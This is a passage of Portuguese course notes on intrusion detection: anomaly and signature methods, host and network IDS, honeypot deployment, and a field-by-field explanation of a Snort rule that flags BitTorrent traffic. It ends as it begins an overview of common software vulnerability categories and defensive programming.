legítimos ao longo do tempo, construindo uma <strong>linha de base</strong> do normal. Duas fases:</p><ol><li><strong>Fase de treinamento:</strong> construir um modelo de comportamento legítimo a partir dos dados dos sensores durante a operação normal. Pode ocorrer em momentos distintos ou ser uma evolução contínua do modelo.</li><li><strong>Fase de detecção:</strong> comparar o comportamento observado com o modelo e classificá-lo como legítimo ou anômalo.</li></ol><p><strong>Três categorias de classificação de anomalia (slides 535 a 539):</strong></p><ol><li><strong>Estatística (slide 536).</strong> Um perfil estatístico das métricas observadas. Univariada trata cada métrica como independente (grosseira, ineficaz). Multivariada considera correlações entre métricas (melhor discriminação). Série temporal usa a ordem e o tempo entre eventos (melhor ainda). Vantagens: simplicidade relativa, baixo custo computacional, nenhuma suposição sobre o comportamento esperado. Desvantagens: difícil selecionar métricas adequadas (o equilíbrio entre falsos positivos e negativos); nem todo comportamento pode ser modelado assim.</li><li><strong>Baseada em conhecimento (slide 537).</strong> Um sistema especialista classifica os dados observados com um conjunto de regras que modelam o comportamento legítimo. Na fase de treinamento as regras são desenvolvidas, possivelmente à mão, para caracterizar os dados de treinamento em classes distintas, com ferramentas formais como máquinas de estados finitos e linguagens de descrição. Vantagens: robustez e flexibilidade. Desvantagens: dificuldade e tempo para desenvolver regras de alta qualidade; especialistas humanos necessários.</li><li><strong>Aprendizado de máquina (slide 538).</strong> Técnicas de mineração de dados desenvolvem o modelo automaticamente a partir dos dados normais de treinamento. O treinamento exige tempo e recursos computacionais significativos; uma vez que o modelo existe, a classificação costuma ser eficiente. Vantagens: flexibilidade, adaptabilidade, captura interdependências complexas entre métricas. Desvantagens: depende de suposições sobre o comportamento aceito; a taxa de falsos alarmes é atualmente inaceitavelmente alta; alto custo de recursos para treinar.</li></ol><p>Abordagens de aprendizado de máquina tentadas com sucesso variado: redes bayesianas (relações probabilísticas), modelos de Markov (estados com probabilidades de transição), redes neurais, lógica fuzzy (raciocínio aproximado, acomoda incerteza), algoritmos genéticos (desenvolvem regras de classificação), agrupamento e detecção de outliers (dado novo dentro de um agrupamento é normal, um outlier é uma anomalia).</p><p><strong>Detecção por assinatura ou heurística (slides 540 a 542),</strong> também chamada <strong>detecção de mau uso:</strong> um conjunto de padrões maliciosos conhecidos ou regras de ataque. O comportamento observado é comparado com eles. Uma correspondência significa um intruso.</p><ul><li><strong>Assinaturas</strong> comparam os dados coletados com padrões conhecidos de dados maliciosos. Precisam de detalhe suficiente para minimizar falsos alarmes e ainda detectar uma fração suficiente dos dados maliciosos. Usadas amplamente em produtos antivírus, proxies de varredura de tráfego de rede e NIDS. <strong>Vantagens:</strong> custo relativamente baixo em tempo e recursos, ampla aceitação. <strong>Desvantagens:</strong> esforço significativo para identificar e revisar comportamento novo para construir assinaturas; <strong>não detecta ataques de dia zero</strong>, para os quais não existe assinatura.</li><li><strong>Heurísticas</strong> usam regras para identificar ataques conhecidos, ou ataques a fraquezas conhecidas, e comportamento suspeito mesmo dentro dos padrões de uso estabelecidos. A fonte mais fértil de regras é a análise de ferramentas e scripts de ataque coletados na Internet, complementada por regras de especialistas. As regras são tipicamente específicas da máquina e do SO. O <strong>Snort</strong> é um NIDS baseado em regras com uma grande coleção de regras.</li></ul><p><strong>Comparação para a lista 9:</strong></p><div class="table-wrapper"><table><thead><tr><th>Critério</th><th>Detecção por assinatura</th><th>Detecção de anomalia</th></tr></thead><tbody><tr><td>Detecta</td><td>Comportamento conhecido, catalogado</td><td>Desvios da linha de base, mesmo desconhecidos</td></tr><tr><td>Ataques dia zero</td><td>Não: não existe assinatura</td><td>Possível: o ataque desvia do normal</td></tr><tr><td>Falsos positivos</td><td>Baixos, se as assinaturas são detalhadas</td><td>Mais altos: sobreposição; taxa de ML inaceitável</td></tr><tr><td>Custo</td><td>Baixo em execução; esforço nas regras</td><td>Treinamento (ML caro); especialistas para regras</td></tr><tr><td>Adaptabilidade</td><td>Uma nova assinatura por novo ataque</td><td>O modelo evolui com o comportamento</td></tr></tbody></table></div><h3 id="_2-8-ids-baseado-em-host-hids" tabindex="-1"><span class="cut mono-1 wght-1 slnt-0 step-3">2</span><span class="cut mono-3 wght-4 slnt-2 step-1">.</span><span class="cut mono-3 wght-5 slnt-1 step-3">8</span> <span class="cut mono-3 wght-2 slnt-3 step-3">I</span><span class="cut mono-1 wght-3 slnt-1 step-0">D</span><span class="cut mono-3 wght-3 slnt-4 step-1">S</span> <span class="cut mono-3 wght-1 slnt-5 step-0">b</span><span class="cut mono-0 wght-3 slnt-4 step-1">a</span><span class="cut mono-1 wght-2 slnt-1 step-1">s</span><span class="cut mono-3 wght-0 slnt-4 step-0">e</span><span class="cut mono-5 wght-2 slnt-1 step-2">a</span><span class="cut mono-2 wght-5 slnt-0 step-3">d</span><span class="cut mono-5 wght-1 slnt-2 step-0">o</span> <span class="cut mono-0 wght-5 slnt-0 step-3">e</span><span class="cut mono-1 wght-4 slnt-0 step-2">m</span> <span class="cut mono-1 wght-3 slnt-0 step-3">h</span><span class="cut mono-1 wght-5 slnt-3 step-1">o</span><span class="cut mono-0 wght-2 slnt-1 step-0">s</span><span class="cut mono-5 wght-2 slnt-2 step-2">t</span> <span class="cut mono-1 wght-2 slnt-3 step-0">(</span><span class="cut mono-3 wght-5 slnt-2 step-2">H</span><span class="cut mono-1 wght-4 slnt-4 step-0">I</span><span class="cut mono-3 wght-5 slnt-2 step-3">D</span><span class="cut mono-1 wght-5 slnt-1 step-1">S</span><span class="cut mono-1 wght-2 slnt-0 step-3">)</span> <a class="header-anchor" href="#_2-8-ids-baseado-em-host-hids" aria-hidden="true">#</a></h3><p><strong>Definição (slide 543):</strong> uma camada especializada de software de segurança em sistemas vulneráveis ou sensíveis, como servidores de banco de dados e sistemas administrativos. Monitora a atividade dentro do sistema. Propósitos: detectar intrusões, registrar eventos suspeitos, enviar alertas. Usa as duas abordagens de análise.</p><p><strong>Quatro fontes de dados para os sensores (slides 544 e 545):</strong></p><ol><li><strong>Rastros de chamadas de sistema:</strong> um registro da sequência de chamadas de sistema feitas pelos processos. Amplamente reconhecido como a fonte preferida para HIDS. Vantagem: funciona bem em Unix e Linux. Desvantagem: problemático no Windows, onde o uso extensivo de DLLs obscurece qual processo faz qual chamada.</li><li><strong>Registros de auditoria:</strong> a maioria dos SOs modernos inclui software de contabilidade que coleta a atividade do usuário. Vantagem: nenhum software extra de coleta. Desvantagens: os registros podem não ter a informação necessária ou um formato conveniente; intrusos podem manipular os logs para esconder suas ações.</li><li><strong>Somas de verificação de integridade de arquivos:</strong> varredura periódica de arquivos críticos (arquivos do sistema), comparando os hashes atuais com uma linha de base de valores conhecidos. Desvantagens: as somas corretas precisam ser geradas e protegidas; arquivos que mudam legitimamente o tempo todo são difíceis de monitorar.</li><li><strong>Acesso ao Registro:</strong> usado no Windows, dada a quantidade de informação e de acessos que os programas fazem ao Registro. Desvantagem: muito específico do Windows, sucesso limitado.</li></ol><p>Função do sensor: coletar dados, filtrá-los em um formato padrão, encaminhá-los ao analisador.</p><p><strong>HIDS de anomalia em Linux e UNIX (slides 546 e 547):</strong> a maior parte do trabalho foi feita aí porque os dados são fáceis de coletar. Fonte preferida: rastros de chamadas de sistema, porque as chamadas de sistema são a forma de os programas alcançarem as funções do kernel, e dão informação detalhada sobre a atividade dos processos. Motores de decisão: a abordagem original <strong>STIDE</strong> compara as sequências de chamadas observadas com as sequências normais do treinamento para obter uma <strong>razão de discordância</strong>. Alternativas do aprendizado de máquina: modelos ocultos de Markov (HMM), redes neurais artificiais (ANN), máquinas de vetores de suporte (SVM), máquinas de aprendizado extremo (ELM). O desempenho é medido por taxa de detecção, falsos positivos e velocidade de detecção.</p><p><strong>HIDS por assinatura (slide 548):</strong> a base do software <strong>antivírus</strong>, em PCs clientes, dispositivos móveis, e embutido em proxies de e-mail e web e em NIDS. Duas técnicas: <strong>assinaturas</strong> (um banco de dados de padrões de arquivo encontrados em malware conhecido) e <strong>heurísticas</strong> (regras que caracterizam comportamento malicioso conhecido). Muito eficiente contra malware conhecido. Não detecta ataques de dia zero, porque o ataque novo não corresponde a nenhuma assinatura ou regra. Amplamente usado no Windows, ainda um alvo principal de intrusos.</p><p><strong>HIDS distribuído (slide 549):</strong> o trabalho tradicional de HIDS ficava isolado em um sistema. Uma organização defende uma coleção distribuída de hosts, então uma defesa mais eficaz vem da coordenação e cooperação entre os IDSs pela rede.</p><h3 id="_2-9-ids-baseado-em-rede-nids" tabindex="-1"><span class="cut mono-4 wght-5 slnt-3 step-2">2</span><span class="cut mono-1 wght-5 slnt-1 step-2">.</span><span class="cut mono-4 wght-0 slnt-5 step-2">9</span> <span class="cut mono-1 wght-3 slnt-0 step-2">I</span><span class="cut mono-2 wght-5 slnt-2 step-3">D</span><span class="cut mono-1 wght-2 slnt-3 step-1">S</span> <span class="cut mono-0 wght-4 slnt-2 step-3">b</span><span class="cut mono-1 wght-0 slnt-2 step-2">a</span><span class="cut mono-5 wght-5 slnt-1 step-0">s</span><span class="cut mono-0 wght-0 slnt-0 step-2">e</span><span class="cut mono-1 wght-4 slnt-0 step-2">a</span><span class="cut mono-1 wght-0 slnt-0 step-0">d</span><span class="cut mono-0 wght-0 slnt-5 step-0">o</span> <span class="cut mono-1 wght-1 slnt-2 step-0">e</span><span class="cut mono-5 wght-4 slnt-0 step-1">m</span> <span class="cut mono-5 wght-1 slnt-1 step-0">r</span><span class="cut mono-3 wght-2 slnt-4 step-1">e</span><span class="cut mono-1 wght-2 slnt-1 step-0">d</span><span class="cut mono-1 wght-0 slnt-1 step-0">e</span> <span class="cut mono-2 wght-0 slnt-3 step-3">(</span><span class="cut mono-0 wght-2 slnt-1 step-0">N</span><span class="cut mono-2 wght-5 slnt-1 step-3">I</span><span class="cut mono-4 wght-4 slnt-3 step-3">D</span><span class="cut mono-5 wght-4 slnt-2 step-3">S</span><span class="cut mono-1 wght-5 slnt-1 step-0">)</span> <a class="header-anchor" href="#_2-9-ids-baseado-em-rede-nids" aria-hidden="true">#</a></h3><p><strong>Definição (slide 550):</strong> monitora o tráfego em pontos selecionados de uma rede, pacote a pacote, em tempo real ou próximo disso. Analisa a atividade nos protocolos de rede (L3), transporte (L4) e aplicação (L7). <strong>Contraste:</strong> o NIDS examina o tráfego de pacotes dirigido aos sistemas; o HIDS examina a atividade de usuários e software dentro de um host. O NIDS é tipicamente parte da infraestrutura de perímetro, embutido no firewall ou ao lado dele, focado em tentativas de intrusão externas. Arquitetura típica: sensores (monitoram o tráfego), servidores de gerência (análise), consoles de gerência (interface humana).</p><p><strong>A grande limitação: criptografia (slide 552).</strong> Com o uso crescente de TLS/SSL, os NIDS perderam acesso a carga útil significativa. Não conseguem ver comandos maliciosos dentro de uma sessão HTTPS. Os NIDS continuam importantes mas só podem ser parte da solução (defesa em profundidade).</p><p><strong>Dois modos de sensor:</strong></p><ol><li><strong>Sensor em linha:</strong> inserido em um segmento de rede, de modo que o tráfego precisa passar por ele. Pode ser combinado com um firewall ou um switch. Vantagem: pode <strong>bloquear</strong> um ataque ao detectá-lo, atuando como IDS e IPS.</li><li><strong>Sensor passivo:</strong> o mais comum. Monitora uma <strong>cópia</strong> do tráfego; o tráfego real não passa pelo dispositivo. Vantagem: mais eficiente, nenhum passo extra de tratamento, nenhum atraso adicional de pacote.</li></ol><p><strong>Configuração passiva (slide 553):</strong> o sensor conecta-se ao meio (cabo de fibra óptica) por uma <strong>derivação</strong> (tap), que lhe dá uma cópia de todo o tráfego. A <strong>NIC 1 (coleta)</strong> está conectada à derivação, normalmente não tem endereço IP, e coleta tudo em modo promíscuo. A <strong>NIC 2 (gerência)</strong> tem endereço IP e fala com o servidor de gerência do NIDS.</p><p><strong>Sensores sem fio:</strong> em linha (embutido em um ponto de acesso) ou passivo (monitorando o ar). Só sensores sem fio podem analisar o tráfego de protocolo sem fio e detectar ataques específicos (DoS sem fio, sequestro de sessão, AP falso). Um <strong>WIDS</strong> é um NIDS focado só em redes sem fio.</p><p><strong>O pipeline do Snort (figura, slide 551):</strong></p><pre class="shiki shiki-themes vitesse-dark vitesse-light s-dark-dbd7caee s-light-393a34 s-dark-bg-121212 s-light-bg-ffffff" tabindex="0"><code class="language-text"><span class="line"><span>Network traffic -&gt; Packet decoder -&gt; Preprocessor -&gt; Detection engine (rules)</span></span>\n<span class="line"><span>-&gt; Logging and alerting system -&gt; Output modules -&gt; Output: alert or log</span></span></code></pre><h3 id="_2-10-honeypots" tabindex="-1"><span class="cut mono-4 wght-2 slnt-3 step-3">2</span><span class="cut mono-3 wght-0 slnt-1 step-3">.</span><span class="cut mono-2 wght-2 slnt-2 step-1">1</span><span class="cut mono-0 wght-5 slnt-5 step-1">0</span> <span class="cut mono-1 wght-2 slnt-4 step-2">H</span><span class="cut mono-0 wght-3 slnt-0 step-3">o</span><span class="cut mono-4 wght-4 slnt-3 step-1">n</span><span class="cut mono-2 wght-0 slnt-4 step-0">e</span><span class="cut mono-4 wght-4 slnt-1 step-0">y</span><span class="cut mono-1 wght-4 slnt-0 step-2">p</span><span class="cut mono-4 wght-5 slnt-5 step-1">o</span><span class="cut mono-2 wght-2 slnt-1 step-0">t</span><span class="cut mono-5 wght-2 slnt-4 step-1">s</span> <a class="header-anchor" href="#_2-10-honeypots" aria-hidden="true">#</a></h3><p><strong>Definição (slide 554):</strong> sistemas-isca projetados para atrair um atacante potencial para longe dos sistemas críticos. <strong>Três objetivos:</strong></p><ol><li><strong>Desviar</strong> o atacante dos sistemas críticos.</li><li><strong>Coletar informação</strong> sobre a atividade, as técnicas e as ferramentas do atacante.</li><li><strong>Ganhar tempo:</strong> encorajar o atacante a ficar tempo suficiente para os administradores responderem.</li></ol><p><strong>A lógica:</strong> o honeypot é preenchido com informação fabricada que parece valiosa mas que um usuário legítimo nunca acessaria. Qualquer acesso é, por definição, suspeito. O sistema é instrumentado com monitores e registradores sensíveis. Como o ataque parece ter sucesso, os administradores podem rastrear o atacante sem expor os sistemas de produção.</p><p><strong>Valor (slide 555):</strong> um recurso sem valor de produção. Qualquer comunicação de entrada é provavelmente uma sondagem, varredura ou ataque. Se um honeypot inicia comunicação de <strong>saída</strong>, ele provavelmente foi comprometido.</p><ul><li><strong>Honeypot de baixa interação:</strong> um pacote de software que <strong>emula</strong> serviços ou sistemas (finge ser um servidor FTP). Dá uma interação inicial realista mas não roda os serviços completos. Vantagem (slide 556): suficiente para detectar os estágios iniciais de um ataque (varredura, sondagem) e alertar, como componente de um IDS distribuído.</li><li><strong>Honeypot de alta interação:</strong> um sistema real, com SO completo e serviços e aplicações reais, instrumentado e colocado onde atacantes podem alcançá-lo. Vantagens: um alvo muito mais realista; pode prender um atacante por muito tempo. Desvantagens: muito mais recursos; e se comprometido, pode ser usado para atacar outros sistemas na Internet, com problemas jurídicos ou de reputação para a organização.</li></ul><p><strong>Honeynet:</strong> o Honeynet Project constrói redes inteiras de honeypots que emulam uma empresa, com tráfego simulado.</p><p><strong>Três posições de implantação (slides 557 a 560):</strong></p><ol><li><strong>Externo, na Internet antes do firewall externo (slide 558).</strong> Vantagens: rastreia tentativas de conexão a IPs não usados (varreduras); nenhum risco adicional à rede interna, porque o perigo de um sistema comprometido atrás do firewall é evitado; reduz o ruído, pois atrai muitos ataques e assim menos alertas chegam ao firewall e aos sensores IDS internos. Desvantagem: pouca ou nenhuma capacidade de capturar atacantes internos.</li><li><strong>DMZ, entre os dois firewalls (slide 559).</strong> Vantagem: monitora ataques aos serviços públicos (web, correio, DNS). Desvantagens: risco de contaminação, os outros sistemas da DMZ precisam ser protegidos contra o honeypot; conflito com o firewall externo, que bloqueia tráfego desnecessário para a DMZ (só portas 80 e 443), então o administrador precisa ou abrir o firewall e aumentar o risco, ou limitar o honeypot, que então perde os ataques bloqueados.</li><li><strong>Interno, na rede corporativa depois do firewall (slide 560).</strong> Vantagens: a mais importante, captura <strong>ataques internos</strong>; detecta um firewall mal configurado que encaminha tráfego da Internet para dentro. Desvantagens: alto risco, um honeypot comprometido ataca outros sistemas internos; o firewall não bloqueia o tráfego do atacante para o honeypot, pois é tráfego &quot;permitido&quot;; o firewall interno precisa de regras de exceção.</li></ol><p><strong>Honeyfiles (slide 560):</strong> emulam documentos legítimos com nomes realistas, como &quot;Salarios Diretoria.xlsx&quot;, como isca. Qualquer acesso é suspeito, porque usuários legítimos não deveriam abri-los.</p><h3 id="_2-11-a-regra-do-snort" tabindex="-1"><span class="cut mono-4 wght-0 slnt-4 step-2">2</span><span class="cut mono-3 wght-1 slnt-4 step-3">.</span><span class="cut mono-2 wght-0 slnt-5 step-2">1</span><span class="cut mono-4 wght-4 slnt-2 step-2">1</span> <span class="cut mono-2 wght-2 slnt-4 step-1">A</span> <span class="cut mono-3 wght-3 slnt-0 step-3">r</span><span class="cut mono-2 wght-1 slnt-0 step-3">e</span><span class="cut mono-5 wght-5 slnt-0 step-2">g</span><span class="cut mono-3 wght-2 slnt-0 step-1">r</span><span class="cut mono-4 wght-0 slnt-1 step-3">a</span> <span class="cut mono-1 wght-3 slnt-2 step-1">d</span><span class="cut mono-1 wght-1 slnt-3 step-1">o</span> <span class="cut mono-1 wght-4 slnt-2 step-2">S</span><span class="cut mono-5 wght-0 slnt-3 step-1">n</span><span class="cut mono-3 wght-5 slnt-1 step-1">o</span><span class="cut mono-5 wght-0 slnt-4 step-2">r</span><span class="cut mono-3 wght-3 slnt-2 step-1">t</span> <a class="header-anchor" href="#_2-11-a-regra-do-snort" aria-hidden="true">#</a></h3><p>A regra no slide 561 e na lista 9:</p><pre class="shiki shiki-themes vitesse-dark vitesse-light s-dark-dbd7caee s-light-393a34 s-dark-bg-121212 s-light-bg-ffffff" tabindex="0"><code class="language-text"><span class="line"><span>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET ![7680,1521]</span></span>\n<span class="line"><span>(msg:&quot;ET P2P BitTorrent peer sync&quot;;</span></span>\n<span class="line"><span> flow:established,to_server;</span></span>\n<span class="line"><span> content:&quot;|00 00 00 0d 06 00|&quot;; depth:6;</span></span>\n<span class="line"><span> threshold: type limit, track by_dst, seconds 300, count 1;</span></span>\n<span class="line"><span> reference:url,bitconjurer.org/BitTorrent/protocol.html;</span></span>\n<span class="line"><span> classtype:policy-violation; sid:2000334; rev:14;</span></span>\n<span class="line"><span> metadata:created_at 2010_07_30, confidence Medium,</span></span>\n<span class="line"><span> signature_severity Informational, updated_at 2025_06_30;)</span></span></code></pre><p><strong>Cabeçalho (slide 562):</strong></p><div class="table-wrapper"><table><thead><tr><th>Parte</th><th>Significado</th></tr></thead><tbody><tr><td><code>alert</code></td><td>A ação: gerar um alerta quando a condição é atendida</td></tr><tr><td><code>tcp</code></td><td>O protocolo: só tráfego TCP</td></tr><tr><td><code>$HOME_NET any</code></td><td>Origem: a rede interna, qualquer porta</td></tr><tr><td><code>-&gt;</code></td><td>Sentido: da origem para o destino</td></tr><tr><td><code>$EXTERNAL_NET ![7680,1521]</code></td><td>Destino: a rede externa, exceto as portas 7680 e 1521</td></tr></tbody></table></div><p><strong>Opções (slides 563 e 564):</strong></p><div class="table-wrapper"><table><thead><tr><th>Opção</th><th>Função</th></tr></thead><tbody><tr><td><code>msg:&quot;ET P2P BitTorrent peer sync&quot;</code></td><td>A mensagem mostrada nos logs</td></tr><tr><td><code>flow:established,to_server</code></td><td>Só conexões TCP estabelecidas, no sentido do servidor</td></tr><tr><td><code>content:&quot;|00 00 00 0d 06 00|&quot;</code></td><td>Busca a sequência de bytes 00 00 00 0d 06 00</td></tr><tr><td><code>depth:6</code></td><td>Busca só nos primeiros 6 bytes da carga útil</td></tr><tr><td><code>threshold: type limit, ...</code></td><td><code>track by_dst, seconds 300, count 1</code>: 1 alerta por destino a cada 300 s</td></tr><tr><td><code>reference:url,...</code></td><td>Link para a documentação do protocolo BitTorrent</td></tr><tr><td><code>classtype:policy-violation</code></td><td>Categoria: violação de política</td></tr><tr><td><code>sid:2000334</code></td><td>Identificador único da regra</td></tr><tr><td><code>rev:14</code></td><td>Número de revisão 14</td></tr><tr><td><code>metadata</code></td><td>Criada em 2010_07_30, atualizada em 2025_06_30, confiança Medium</td></tr></tbody></table></div><p>Material externo:</p><ul><li>NIST CSRC, artigo: <a href="https://csrc.nist.gov/pubs/sp/800/61/r3/final" target="_blank" rel="noopener">SP 800-61 Rev. 3, Incident Response Recommendations and Considerations for Cybersecurity Risk Management</a> O guia de resposta a incidentes que os slides citam para os exemplos de intrusão.</li><li>The Honeynet Project, site: <a href="https://www.honeynet.org/" target="_blank" rel="noopener">honeynet.org</a> O projeto citado no slide 556.</li><li>Snort, documentação: <a href="https://docs.snort.org/rules/" target="_blank" rel="noopener">Snort 3 rule writing</a> A referência para cabeçalhos e opções de regra como <code>flow</code>, <code>content</code>, <code>depth</code> e <code>threshold</code>.</li></ul><hr><h2 id="parte-3-vulnerabilidades-de-software-aula-16" tabindex="-1"><span class="cut mono-4 wght-1 slnt-0 step-1">P</span><span class="cut mono-0 wght-0 slnt-5 step-3">A</span><span class="cut mono-1 wght-5 slnt-1 step-1">R</span><span class="cut mono-5 wght-0 slnt-1 step-3">T</span><span class="cut mono-0 wght-1 slnt-0 step-3">E</span> <span class="cut mono-3 wght-3 slnt-1 step-0">3</span><span class="cut mono-3 wght-2 slnt-3 step-3">:</span> <span class="cut mono-0 wght-1 slnt-2 step-0">V</span><span class="cut mono-3 wght-5 slnt-4 step-2">u</span><span class="cut mono-0 wght-1 slnt-2 step-2">l</span><span class="cut mono-0 wght-4 slnt-2 step-0">n</span><span class="cut mono-0 wght-0 slnt-2 step-1">e</span><span class="cut mono-2 wght-4 slnt-3 step-3">r</span><span class="cut mono-3 wght-5 slnt-0 step-3">a</span><span class="cut mono-3 wght-5 slnt-0 step-2">b</span><span class="cut mono-3 wght-4 slnt-1 step-2">i</span><span class="cut mono-0 wght-4 slnt-2 step-0">l</span><span class="cut mono-0 wght-1 slnt-1 step-3">i</span><span class="cut mono-4 wght-3 slnt-4 step-0">d</span><span class="cut mono-2 wght-5 slnt-4 step-0">a</span><span class="cut mono-4 wght-5 slnt-3 step-3">d</span><span class="cut mono-1 wght-1 slnt-2 step-1">e</span><span class="cut mono-0 wght-3 slnt-0 step-3">s</span> <span class="cut mono-2 wght-5 slnt-3 step-0">d</span><span class="cut mono-0 wght-3 slnt-4 step-2">e</span> <span class="cut mono-2 wght-2 slnt-2 step-0">s</span><span class="cut mono-1 wght-3 slnt-4 step-2">o</span><span class="cut mono-1 wght-3 slnt-4 step-3">f</span><span class="cut mono-0 wght-2 slnt-0 step-2">t</span><span class="cut mono-0 wght-4 slnt-1 step-3">w</span><span class="cut mono-3 wght-3 slnt-1 step-0">a</span><span class="cut mono-3 wght-2 slnt-2 step-1">r</span><span class="cut mono-4 wght-3 slnt-2 step-0">e</span> <span class="cut mono-1 wght-0 slnt-4 step-2">(</span><span class="cut mono-0 wght-4 slnt-3 step-3">A</span><span class="cut mono-3 wght-5 slnt-5 step-3">u</span><span class="cut mono-4 wght-0 slnt-0 step-3">l</span><span class="cut mono-4 wght-3 slnt-5 step-1">a</span> <span class="cut mono-3 wght-2 slnt-5 step-1">1</span><span class="cut mono-4 wght-2 slnt-4 step-3">6</span><span class="cut mono-0 wght-1 slnt-4 step-1">)</span> <a class="header-anchor" href="#parte-3-vulnerabilidades-de-software-aula-16" aria-hidden="true">#</a></h2><h3 id="_3-1-a-raiz-do-problema" tabindex="-1"><span class="cut mono-2 wght-2 slnt-5 step-2">3</span><span class="cut mono-4 wght-1 slnt-2 step-2">.</span><span class="cut mono-0 wght-3 slnt-0 step-1">1</span> <span class="cut mono-0 wght-3 slnt-3 step-3">A</span> <span class="cut mono-4 wght-2 slnt-0 step-2">r</span><span class="cut mono-2 wght-3 slnt-5 step-3">a</span><span class="cut mono-3 wght-1 slnt-5 step-1">i</span><span class="cut mono-2 wght-2 slnt-3 step-2">z</span> <span class="cut mono-3 wght-3 slnt-1 step-0">d</span><span class="cut mono-4 wght-4 slnt-5 step-0">o</span> <span class="cut mono-2 wght-0 slnt-5 step-3">p</span><span class="cut mono-5 wght-1 slnt-0 step-2">r</span><span class="cut mono-5 wght-1 slnt-0 step-2">o</span><span class="cut mono-4 wght-3 slnt-3 step-0">b</span><span class="cut mono-5 wght-0 slnt-4 step-1">l</span><span class="cut mono-4 wght-1 slnt-0 step-0">e</span><span class="cut mono-1 wght-0 slnt-4 step-1">m</span><span class="cut mono-4 wght-2 slnt-3 step-3">a</span> <a class="header-anchor" href="#_3-1-a-raiz-do-problema" aria-hidden="true">#</a></h3><p>Muitas vulnerabilidades de segurança resultam de <strong>más práticas de programação</strong> (slide 566). A consciência dessas falhas é o primeiro passo para código mais seguro. O <strong>OWASP Top 10</strong> de riscos em aplicações web inclui <strong>cinco</strong> falhas diretamente ligadas a código inseguro:</p><ol><li>Entrada não validada.</li><li>Cross-site scripting (XSS).</li><li>Estouro de buffer.</li><li>Falhas de injeção.</li><li>Tratamento de erro inadequado.</li></ol><p><strong>CWE/SANS Top 25 Most Dangerous Software Errors (slides 567 a 570):</strong> o consenso sobre as práticas que causam a maioria dos ataques cibernéticos, em <strong>três categorias</strong>.</p><ol><li><strong>Interação insegura entre componentes (slide 568):</strong> injeção de SQL (neutralização inadequada de elementos especiais em um comando SQL); injeção de comando do SO; cross-site scripting (neutralização inadequada da entrada durante a geração de página web); upload irrestrito de arquivo de tipo perigoso; cross-site request forgery (CSRF); redirecionamento de URL para site não confiável (open redirect).</li><li><strong>Gerência arriscada de recursos (slide 569):</strong> cópia de buffer sem verificar o tamanho da entrada (estouro de buffer); limitação inadequada de um caminho a um diretório restrito (path traversal); download de código sem verificação de integridade; inclusão de funcionalidade de uma esfera de controle não confiável; uso de função potencialmente perigosa; cálculo incorreto do tamanho do buffer; string de formato não controlada; estouro de inteiro ou wraparound.</li><li><strong>Defesas porosas (slide 570):</strong> falta de autenticação em função crítica; falta de autorização; credenciais fixas no código; falta de cifragem de dados sensíveis; dependência de entradas não confiáveis em uma decisão de segurança; execução com privilégios desnecessários; autorização incorreta; atribuição incorreta de permissão a um recurso crítico; uso de algoritmo criptográfico quebrado ou arriscado; restrição inadequada de tentativas excessivas de autenticação; hash de mão única sem sal.</li></ol><h3 id="_3-2-falha-de-software-versus-seguranca-de-software" tabindex="-1"><span class="cut mono-4 wght-0 slnt-3 step-3">3</span><span class="cut mono-1 wght-3 slnt-5 step-2">.</span><span class="cut mono-2 wght-3 slnt-3 step-0">2</span> <span class="cut mono-1 wght-5 slnt-1 step-0">F</span><span class="cut mono-1 wght-2 slnt-4 step-0">a</span><span class="cut mono-0 wght-4 slnt-4 step-0">l</span><span class="cut mono-1 wght-3 slnt-4 step-0">h</span><span class="cut mono-0 wght-1 slnt-1 step-1">a</span> <span class="cut mono-4 wght-5 slnt-2 step-2">d</span><span class="cut mono-2 wght-0 slnt-4 step-0">e</span> <span class="cut mono-5 wght-4 slnt-1 step-2">s</span><span class="cut mono-0 wght-2 slnt-4 step-0">o</span><span class="cut mono-4 wght-1 slnt-3 step-3">f</span><span class="cut mono-0 wght-1 slnt-1 step-1">t</span><span class="cut mono-4 wght-2 slnt-5 step-0">w</span><span class="cut mono-2 wght-1 slnt-3 step-0">a</span><span class="cut mono-0 wght-0 slnt-3 step-0">r</span><span class="cut mono-1 wght-1 slnt-5 step-0">e</span> <span class="cut mono-1 wght-1 slnt-0 step-3">v</span><span class="cut mono-4 wght-3 slnt-0 step-0">e</span><span class="cut mono-3 wght-1 slnt-3 step-0">r</span><span class="cut mono-0 wght-1 slnt-1 step-2">s</span><span class="cut mono-0 wght-4 slnt-5 step-1">u</span><span class="cut mono-4 wght-5 slnt-1 step-2">s</span> <span class="cut mono-5 wght-1 slnt-1 step-3">s</span><span class="cut mono-1 wght-4 slnt-1 step-0">e</span><span class="cut mono-4 wght-2 slnt-3 step-3">g</span><span class="cut mono-0 wght-4 slnt-2 step-3">u</span><span class="cut mono-2 wght-4 slnt-5 step-3">r</span><span class="cut mono-1 wght-1 slnt-5 step-0">a</span><span class="cut mono-0 wght-0 slnt-0 step-1">n</span><span class="cut mono-3 wght-1 slnt-5 step-0">ç</span><span class="cut mono-5 wght-5 slnt-1 step-1">a</span> <span class="cut mono-5 wght-0 slnt-1 step-2">d</span><span class="cut mono-0 wght-0 slnt-1 step-0">e</span> <span class="cut mono-4 wght-4 slnt-3 step-2">s</span><span class="cut mono-2 wght-3 slnt-5 step-0">o</span><span class="cut mono-5 wght-5 slnt-3 step-2">f</span><span class="cut mono-4 wght-0 slnt-5 step-1">t</span><span class="cut mono-5 wght-2 slnt-0 step-0">w</span><span class="cut mono-5 wght-1 slnt-2 step-3">a</span><span class="cut mono-2 wght-3 slnt-0 step-1">r</span><span class="cut mono-0 wght-5 slnt-3 step-3">e</span> <a class="header-anchor" href="#_3-2-falha-de-software-versus-seguranca-de-software" aria-hidden="true">#</a></h3><p><strong>Falhas de programa (slide 571)</strong> resultam de entrada não prevista, interação com o sistema, ou código incorreto. Espera-se que sigam alguma distribuição de probabilidade. A abordagem usual de qualidade usa projeto estruturado e testes para remover tantos bugs quanto razoavelmente possível. Os testes cobrem variações prováveis de entrada e erros comuns. A preocupação principal não é o número total de bugs, mas com que frequência são disparados.</p><p><strong>A segurança de software difere (slide 572):</strong> o <strong>atacante escolhe a distribuição de probabilidade</strong>, mirando bugs específicos cuja falha é explorável. Esses bugs são disparados por entradas que diferem drasticamente do esperado, então é improvável que testes comuns os encontrem. Código seguro exige atenção a cada aspecto de como o programa roda, seu ambiente e seus dados. Nada pode ser suposto, e todo erro potencial precisa ser verificado.</p><p><strong>Programação defensiva (ou segura) (slide 573):</strong> o processo de projetar e implementar software de modo que continue funcionando mesmo sob ataque. O software detecta condições errôneas causadas por um ataque e ou continua com segurança ou <strong>falha de forma graciosa</strong>. <strong>A 